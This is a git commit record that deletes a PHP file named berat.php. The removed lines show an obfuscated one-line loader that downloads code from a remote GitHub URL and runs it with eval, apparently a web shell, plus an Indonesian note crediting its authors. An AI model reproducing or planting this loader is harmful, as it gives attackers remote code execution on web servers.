07f442bae0964ea9ecfd94c755795ccb1f6a0a95
whiterose7777 <anonymous.ind777@gmail.com>
2024-11-05 00:36:54 +0700

    Delete berat.php

--- berat.php
+++
@@ -1,3 +0,0 @@
-<?=/**/@null; /**/ /*/ /**/@eval/**/ ("?>".file_get_contents (rawurldecode(urldecode("https://raw.githubusercontent.com/ClayHaxor/alfah/master/alfah1")))); /**/ ?>
-
-eittsss.... dilarang kopas kode form/destahaxor /@haxorqt telegram
